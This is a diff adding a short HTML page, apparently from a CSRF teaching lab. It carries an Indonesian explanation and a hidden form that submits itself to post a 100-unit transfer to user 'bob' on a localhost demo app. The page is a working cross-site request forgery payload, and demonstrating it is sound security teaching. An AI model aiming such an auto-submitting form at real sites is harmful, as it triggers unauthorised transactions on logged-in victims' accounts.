@@ -1,0 +1,19 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>Malicious Demo</title></head>
+<body>
+<h2>Malicious page (CSRF demo)</h2>
+<p>Jika target sudah login di tab lain, page ini akan mencoba mengirim POST transfer.</p>
+
+<!-- Teknik 1: auto-submit form -->
+<form id="attackForm" action="http://127.0.0.1:5000/transfer" method="POST">
+  <input type="hidden" name="to_user" value="bob">
+  <input type="hidden" name="amount" value="100">
+</form>
+
+<script>
+  // auto-submit after 1s
+  setTimeout(function(){ document.getElementById('attackForm').submit(); }, 1000);
+</script>
+</body>
+</html>
